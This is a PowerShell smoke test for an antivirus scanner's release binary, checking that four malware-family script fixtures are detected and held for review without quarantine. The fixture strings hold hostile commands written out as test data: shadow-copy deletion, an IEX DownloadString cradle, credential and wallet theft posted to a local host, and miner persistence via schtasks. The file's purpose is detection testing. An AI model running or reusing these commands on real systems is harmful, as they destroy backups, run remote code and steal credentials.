param(
  [string]$RepoRoot = $(Resolve-Path (Join-Path $PSScriptRoot "..\..")),
  [string]$LocalCorePath = "",
  [int]$TimeoutSeconds = 180
)

$ErrorActionPreference = "Stop"

function Get-BoundedText {
  param([AllowNull()][object]$Value, [int]$MaxChars = 4096)
  if ($null -eq $Value) { return "" }
  $text = [string]$Value
  $text = $text -replace "[`0-\x1F\x7F]+", " "
  if ($text.Length -le $MaxChars) { return $text }
  return $text.Substring(0, [Math]::Max(0, $MaxChars - 3)) + "..."
}

function Restore-EnvVar {
  param(
    [string]$Name,
    [AllowNull()][object]$Value
  )
  if ($null -eq $Value) {
    if (Test-Path -Path "Env:\$Name") {
      Remove-Item -Path "Env:\$Name" -ErrorAction Stop
    }
  } else {
    Set-Item -Path "Env:\$Name" -Value $Value -ErrorAction Stop
  }
}

function Resolve-LocalCoreBinary {
  param(
    [string]$Repo,
    [string]$ConfiguredPath
  )
  $candidate = $ConfiguredPath
  if ([string]::IsNullOrWhiteSpace($candidate)) {
    $candidate = Join-Path $Repo "target\release\zentor_local_core.exe"
  }
  if (-not (Test-Path -LiteralPath $candidate -PathType Leaf)) {
    throw "Release local-core binary is missing: $candidate. Run cargo build --release --manifest-path core\zentor_local_core\Cargo.toml first."
  }
  $resolved = (Resolve-Path -LiteralPath $candidate).Path
  if ([System.IO.Path]::GetFileName($resolved) -ne "zentor_local_core.exe") {
    throw "Release local-core quick-scan family script smoke expects zentor_local_core.exe, got: $resolved"
  }
  return $resolved
}

function Resolve-EngineAssetsRoot {
  param([string]$Repo)
  $candidate = Join-Path $Repo "assets\zentor_native"
  if (-not (Test-Path -LiteralPath $candidate -PathType Container)) {
    throw "Release local-core quick-scan family script smoke requires bundled engine assets: $candidate"
  }
  foreach ($requiredChild in @("signatures", "rules", "ml", "trust")) {
    $child = Join-Path $candidate $requiredChild
    if (-not (Test-Path -LiteralPath $child -PathType Container)) {
      throw "Bundled engine assets root is missing required child directory: $child"
    }
  }
  return (Resolve-Path -LiteralPath $candidate).Path
}

function Invoke-LocalCoreBinaryJson {
  param(
    [hashtable]$Command,
    [string]$InputJsonPath,
    [string]$Repo,
    [string]$Binary,
    [int]$Timeout
  )

  $json = $Command | ConvertTo-Json -Compress
  [System.IO.File]::WriteAllText(
    $InputJsonPath,
    $json + "`r`n",
    [System.Text.UTF8Encoding]::new($false)
  )

  $process = $null
  try {
    $startInfo = [System.Diagnostics.ProcessStartInfo]::new()
    $startInfo.FileName = "cmd.exe"
    $startInfo.WorkingDirectory = $Repo
    $startInfo.Arguments = "/d /c `"type `"$InputJsonPath`" | `"$Binary`"`""
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true

    $process = [System.Diagnostics.Process]::Start($startInfo)
    $stdoutTask = $process.StandardOutput.ReadToEndAsync()
    $stderrTask = $process.StandardError.ReadToEndAsync()

    if (-not $process.WaitForExit($Timeout * 1000)) {
      try {
        $process.Kill($true)
        $process.WaitForExit(5000) | Out-Null
      } catch {
        throw "release local-core quick-scan family script smoke timed out after ${Timeout}s and failed to stop: $(Get-BoundedText $_.Exception.Message)"
      }
      throw "release local-core quick-scan family script smoke timed out after ${Timeout}s."
    }

    $stdout = $stdoutTask.Result
    $stderr = $stderrTask.Result
    if ($process.ExitCode -ne 0) {
      throw "release local-core exited with $($process.ExitCode): $(Get-BoundedText $stderr)"
    }

    $jsonResponses = @()
    foreach ($line in ($stdout -split "`r?`n")) {
      $trimmed = $line.Trim()
      if ($trimmed.Length -eq 0) { continue }
      try {
        $body = $trimmed | ConvertFrom-Json -ErrorAction Stop
      } catch {
        throw "release local-core emitted non-JSON stdout during quick-scan family script smoke: $(Get-BoundedText $trimmed)"
      }
      if ($body.type -eq "scan_progress" -or $body.type -eq "progress") {
        continue
      }
      $jsonResponses += $body
    }
    if ($jsonResponses.Count -eq 0) {
      throw "release local-core produced no JSON response. stderr: $(Get-BoundedText $stderr)"
    }
    return $jsonResponses[-1]
  } finally {
    if ($null -ne $process -and -not $process.HasExited) {
      $process.Kill($true)
    }
  }
}

function New-FamilyScriptFixture {
  param(
    [string]$FileName,
    [string]$Text,
    [string]$ExpectedCategory,
    [string]$RequiredReason
  )
  [ordered]@{
    FileName = $FileName
    Text = $Text
    ExpectedCategory = $ExpectedCategory
    RequiredReason = $RequiredReason
  }
}

$repo = (Resolve-Path -LiteralPath $RepoRoot).Path
$binary = Resolve-LocalCoreBinary $repo $LocalCorePath
$engineAssetRoot = Resolve-EngineAssetsRoot $repo

$tempRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("avorax-release-local-core-quickscan-family-script-smoke-" + [System.Guid]::NewGuid().ToString("N"))
$dataRoot = Join-Path $tempRoot "data"
$legacyRoot = Join-Path $tempRoot "legacy-data"
$quarantineRoot = Join-Path $tempRoot "quarantine"
$downloadsRoot = Join-Path $tempRoot "Downloads"
$allowlistFile = Join-Path $tempRoot "allowlist.json"
$inputJson = Join-Path $tempRoot "local-core-command.json"

$previousDataDir = $env:AVORAX_DATA_DIR
$previousLegacyDataDir = $env:ZENTOR_LEGACY_DATA_DIR
$previousQuarantineDir = $env:AVORAX_QUARANTINE_DIR
$previousAllowlistFile = $env:ZENTOR_ALLOWLIST_FILE
$previousEngineDir = $env:AVORAX_ENGINE_DIR

try {
  New-Item -ItemType Directory -Path $dataRoot -Force | Out-Null
  New-Item -ItemType Directory -Path $legacyRoot -Force | Out-Null
  New-Item -ItemType Directory -Path $downloadsRoot -Force | Out-Null
  [System.IO.File]::WriteAllText(
    $allowlistFile,
    "[]`r`n",
    [System.Text.UTF8Encoding]::new($false)
  )

  $familyFixtures = @(
    (New-FamilyScriptFixture "ransom-family-release.ps1" "your files have been encrypted. decrypt your files. vssadmin delete shadows /all /quiet" "ransomware" "ZNE-RULE-RANSOM-BACKUP-DELETE-NOTE"),
    (New-FamilyScriptFixture "collector-family-release.js" "read browser credentials from Login Data and wallet.dat then zip staging archive and POST to http://127.0.0.1/upload" "infostealer" "ZNE-RULE-INFOSTEALER-CREDS-ARCHIVE-NETWORK"),
    (New-FamilyScriptFixture "miner-family-release.ps1" "stratum+tcp://pool.example.invalid schtasks /create /tn worker" "miner" "ZNE-RULE-MINER-POOL-PERSISTENCE"),
    (New-FamilyScriptFixture "startup-family-release.ps1" "powershell -NoProfile -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/updater.txt'); schtasks /create /tn Updater /tr C:\Users\Public\updater.exe; New-Service -Name Updater -BinaryPathName C:\Users\Public\updater.exe" "persistenceIndicator" "ZNE-RULE-PERSISTENCE-RUNKEY-SCRIPT")
  )

  foreach ($fixture in $familyFixtures) {
    [System.IO.File]::WriteAllText(
      (Join-Path $downloadsRoot $fixture.FileName),
      $fixture.Text,
      [System.Text.UTF8Encoding]::new($false)
    )
  }
  $benignFile = Join-Path $downloadsRoot "benign-release-note.txt"
  [System.IO.File]::WriteAllText(
    $benignFile,
    "benign release quick-scan family-script smoke file`r`n",
    [System.Text.UTF8Encoding]::new($false)
  )

  $env:AVORAX_DATA_DIR = $dataRoot
  $env:ZENTOR_LEGACY_DATA_DIR = $legacyRoot
  $env:AVORAX_QUARANTINE_DIR = $quarantineRoot
  $env:ZENTOR_ALLOWLIST_FILE = $allowlistFile
  $env:AVORAX_ENGINE_DIR = $repo

  $scan = Invoke-LocalCoreBinaryJson @{
    command = "quick_scan_selected_paths"
    paths = @($downloadsRoot)
    action_mode = "autoQuarantineConfirmedOnly"
    scan_kind = "quick"
  } $inputJson $repo $binary $TimeoutSeconds

  $expectedCarrierCount = @($familyFixtures).Count
  if ($scan.status -ne "threatsFound") {
    throw "release local-core quick_scan_selected_paths did not return a threat status for family script fixtures: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  $filesScanned = if ($null -ne $scan.files_scanned) { [int64]$scan.files_scanned } else { 0 }
  if ($filesScanned -lt $expectedCarrierCount) {
    throw "release local-core quick_scan_selected_paths did not scan every family script fixture: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  $quarantinedFiles = if ($null -ne $scan.quarantined_files) { [int64]$scan.quarantined_files } else { 0 }
  if ($quarantinedFiles -ne 0) {
    throw "release local-core quick_scan_selected_paths quarantined review-only family script fixtures: $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
  }
  if (@($scan.scan_errors).Count -ne 0) {
    throw "release local-core quick_scan_selected_paths reported scan errors during family script smoke: $(Get-BoundedText ($scan.scan_errors | ConvertTo-Json -Compress -Depth 8))"
  }

  foreach ($fixture in $familyFixtures) {
    $carrierFile = Join-Path $downloadsRoot $fixture.FileName
    $threat = @($scan.threats) | Where-Object {
      $_.file_name -eq $fixture.FileName -and
      $_.status -eq "detected" -and
      $_.threat_category -eq $fixture.ExpectedCategory -and
      $_.recommended_action -eq "review" -and
      ($_.risk_score.verdict -eq "suspicious" -or $_.risk_score.verdict -eq "probableMalware")
    } | Select-Object -First 1
    if ($null -eq $threat) {
      throw "release local-core quick_scan_selected_paths did not report expected review-only $($fixture.ExpectedCategory) finding for $($fixture.FileName): $(Get-BoundedText ($scan | ConvertTo-Json -Compress -Depth 8))"
    }
    $reason = @($threat.risk_score.reasons) | Where-Object {
      $_.id -eq $fixture.RequiredReason
    } | Select-Object -First 1
    if ($null -eq $reason) {
      throw "release local-core quick_scan_selected_paths did not include $($fixture.RequiredReason) evidence for $($fixture.FileName): $(Get-BoundedText ($threat | ConvertTo-Json -Compress -Depth 12))"
    }
    if (-not (Test-Path -LiteralPath $carrierFile -PathType Leaf)) {
      throw "release local-core quick_scan_selected_paths removed a review-only family script fixture: $carrierFile"
    }
  }
  if (-not (Test-Path -LiteralPath $benignFile -PathType Leaf)) {
    throw "release local-core quick_scan_selected_paths removed the benign non-matching fixture"
  }

  $list = Invoke-LocalCoreBinaryJson @{ command = "list_quarantine" } $inputJson $repo $binary $TimeoutSeconds
  if ($list.ok -ne $true) {
    throw "release local-core list_quarantine failed after family script quick scan: $(Get-BoundedText ($list | ConvertTo-Json -Compress -Depth 8))"
  }
  if (@($list.records).Count -ne 0) {
    throw "release local-core created quarantine records after review-only family script scan: $(Get-BoundedText ($list | ConvertTo-Json -Compress -Depth 8))"
  }

  Write-Host "Avorax release local-core quick-scan family script smoke test passed."
  Write-Host "Binary: $binary"
  Write-Host "Engine dir: $repo"
  Write-Host "Bundled asset dir: $engineAssetRoot"
  Write-Host "Scan root: $downloadsRoot"
  Write-Host "Family script carriers: $expectedCarrierCount"
  Write-Host "Files scanned: $filesScanned"
  Write-Host "Threats: $(@($scan.threats).Count)"
  Write-Host "Quarantined files: $quarantinedFiles"
} finally {
  Restore-EnvVar "AVORAX_DATA_DIR" $previousDataDir
  Restore-EnvVar "ZENTOR_LEGACY_DATA_DIR" $previousLegacyDataDir
  Restore-EnvVar "AVORAX_QUARANTINE_DIR" $previousQuarantineDir
  Restore-EnvVar "ZENTOR_ALLOWLIST_FILE" $previousAllowlistFile
  Restore-EnvVar "AVORAX_ENGINE_DIR" $previousEngineDir
  if (Test-Path -LiteralPath $tempRoot) {
    Remove-Item -LiteralPath $tempRoot -Recurse -Force -ErrorAction Stop
  }
}
